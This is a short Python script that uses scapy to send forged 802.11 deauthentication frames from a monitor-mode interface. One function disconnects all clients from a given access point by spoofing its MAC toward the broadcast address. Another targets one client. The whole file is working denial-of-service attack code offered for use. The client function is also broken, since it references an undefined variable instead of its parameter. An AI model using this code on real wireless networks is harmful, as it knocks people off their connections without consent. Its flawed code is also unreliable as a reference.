from scapy.all import *

interface = 'wlp5s0mon'
client_fake_MAC = 'FF:FF:FF:FF:FF:FF' # This is for AP Attack without CLient MAC Address

# def deauth_specific_victim(Victim_MAC, AP_MAC):
#     packet = RadioTap()/Dot11(addr1=Victim_MAC, addr2=AP_MAC, addr3=AP_MAC)/Dot11Deauth()
#     return packet
#
# def deauth_ap(AP_MAC):
#     packet_ap = RadioTap()/Dot11(addr1=client_fake_MAC, addr2=AP_MAC, addr3=AP_MAC)/Dot11Deauth()
#     return packet_ap

def craft_deauth_attack_to_AP(AP_MAC):
    pkt = RadioTap()/Dot11(addr1=client_fake_MAC, addr2=AP_MAC, addr3=AP_MAC)/Dot11Deauth()
    sendp(pkt, iface = interface, count = 20, inter= .001)

def craft_deauth_attack_to_client(target, AP_MAC):
    pkt = RadioTap()/Dot11(addr1=Victim_MAC, addr2=AP_MAC, addr3=AP_MAC)/Dot11Deauth()
    sendp(pkt, iface = interface, count = 20, inter= .001)
